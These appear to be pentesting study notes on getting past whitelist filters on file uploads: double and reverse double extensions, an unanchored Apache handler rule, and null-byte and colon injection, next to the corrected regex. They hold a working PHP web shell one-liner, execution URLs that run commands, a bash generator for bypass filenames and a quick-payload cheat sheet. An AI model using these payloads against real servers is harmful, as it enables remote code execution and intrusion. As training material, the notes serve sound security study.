# File Upload Attacks – Whitelist Filters

## Overview

Whitelist validation allows only explicitly approved file extensions.

Example allowed types:

- .jpg
- .jpeg
- .png
- .gif

Whitelists are generally more secure than blacklists because they define exactly what is permitted.

However, poorly implemented whitelist logic can still be bypassed.

Common weaknesses include:

- incorrect regex patterns
- improper extension parsing
- server misconfiguration
- filename interpretation inconsistencies
- character parsing issues

Even when `.php` is blocked, attackers may still execute code through filename manipulation.

Think of whitelist filtering as a locked door — but poorly written rules may accidentally leave windows open.

---

# 1. How Whitelist Validation Works

Whitelist validation checks whether a filename matches approved extensions.

Example vulnerable implementation:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

Logic:

- checks whether filename contains allowed extension
- does not verify that extension is final
- allows bypass via extension manipulation

Correct validation should ensure filename ends with allowed extension.

Secure regex example:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

Notice the `$` ensures the extension appears at the end of the filename.

---

# 2. Identifying Whitelist Behaviour

When fuzzing extensions:

- common PHP extensions are blocked
- only image extensions allowed
- error message remains consistent

Example error:

```
Only images are allowed
```

Even when using:

```
shell.phtml
shell.php5
shell.phar
```

upload fails.

Indicates whitelist enforcement.

---

# 3. Double Extension Bypass

Weak regex patterns often allow double extensions.

Example vulnerable pattern:

```
^.*\.(jpg|jpeg|png|gif)
```

Checks whether filename contains allowed extension anywhere.

Bypass example:

```
shell.jpg.php
```

Why it works:

- filename contains ".jpg"
- whitelist condition satisfied
- server processes final extension ".php"

Result:

PHP code executes.

Example upload:

```
filename="shell.jpg.php"
```

Payload:

```php
<?php system($_REQUEST['cmd']); ?>
```

Execution:

```
http://<SERVER_IP>:<PORT>/uploads/shell.jpg.php?cmd=id
```

---

# 4. Strict Regex Protection

More secure regex requires allowed extension at end of filename.

Example:

```php
/^.*\.(jpg|jpeg|png|gif)$/
```

Double extension attack fails because filename ends with `.php`.

Example blocked payload:

```
shell.jpg.php
```

However, bypass may still be possible due to server configuration issues.

---

# 5. Reverse Double Extension (Server Misconfiguration)

Server configuration may allow execution if filename contains PHP extension anywhere.

Example Apache configuration:

```apache
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

Misconfiguration:

missing end-of-line anchor `$`.

Effect:

any filename containing `.php` may execute as PHP.

Example bypass:

```
shell.php.jpg
```

Why it works:

- upload passes whitelist because extension ends with `.jpg`
- server executes PHP because filename contains `.php`

Execution:

```
http://<SERVER_IP>:<PORT>/uploads/shell.php.jpg?cmd=id
```

---

# 6. Character Injection Bypass

Certain characters may confuse filename parsing.

Potential injection characters:

```
%20
%0a
%00
%0d0a
/
.\
.
…
:
```

These may affect how filename is interpreted by:

- web application
- filesystem
- web server
- OS

Example techniques:

## Null byte injection (legacy PHP)

```
shell.php%00.jpg
```

Server interprets filename as:

```
shell.php
```

while validation sees:

```
shell.php%00.jpg
```

## Windows colon injection

```
shell.aspx:.jpg
```

May be stored as:

```
shell.aspx
```

depending on filesystem behaviour.

---

# 7. Generating Character Injection Payloads

Example script to generate payload variations:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar' '.phtm' '.phtml'; do
        echo "phpbash$char$ext.jpg" >> wordlist.txt
        echo "phpbash$ext$char.jpg" >> wordlist.txt
        echo "phpbash.jpg$char$ext" >> wordlist.txt
        echo "phpbash.jpg$ext$char" >> wordlist.txt
    done
done
```

Generated filenames may bypass validation depending on:

- server version
- OS behaviour
- parsing implementation
- filesystem interpretation

---

# 8. Common Whitelist Weaknesses

Typical issues:

- regex checks extension anywhere
- regex missing end-of-line anchor
- improper filename parsing
- multi-extension interpretation
- inconsistent validation layers
- developer misunderstanding regex syntax

Examples of bypass filenames:

```
shell.jpg.php
shell.php.jpg
shell.jpg.phtml
shell.png.php
shell.php%00.jpg
shell.aspx:.jpg
shell.jpg.phar
```

---

# 9. Testing Workflow

## Step 1 – confirm whitelist enforcement

Attempt upload with common script extensions.

## Step 2 – fuzz allowed extensions

Identify permitted file types.

## Step 3 – attempt double extension bypass

Try:

```
shell.jpg.php
```

## Step 4 – attempt reverse double extension

Try:

```
shell.php.jpg
```

## Step 5 – test character injection

Inject special characters.

## Step 6 – upload web shell

Confirm upload success.

## Step 7 – verify execution

Test command output.

---

# 10. Quick Payload Examples

## basic PHP shell

```php
<?php system($_REQUEST['cmd']); ?>
```

## double extension

```
shell.jpg.php
```

## reverse double extension

```
shell.php.jpg
```

## null byte injection

```
shell.php%00.jpg
```

## colon injection (Windows)

```
shell.aspx:.jpg
```

## execution example

```
http://<SERVER_IP>:<PORT>/uploads/shell.php.jpg?cmd=whoami
```

---

# 11. Why Whitelists Can Still Fail

Whitelist security depends on:

- correct regex implementation
- proper filename parsing
- secure server configuration
- consistent validation layers
- correct handling of encoded characters

Weak implementation introduces bypass opportunities.

Whitelist filtering improves security but does not eliminate risk.

---

# 12. Key Takeaways

- whitelist validation allows only approved extensions
- incorrect regex patterns allow bypass
- double extensions may bypass validation
- server misconfiguration may execute embedded extensions
- character injection may alter filename interpretation
- multiple validation layers must be consistent
- secure file handling requires extension and content validation
- whitelist filtering is stronger than blacklist filtering but still imperfect

---

# Tags

#file-upload
#whitelist
#double-extension
#bypass
#regex
#web-shell
#rce
#pentesting
#ctf
#obsidian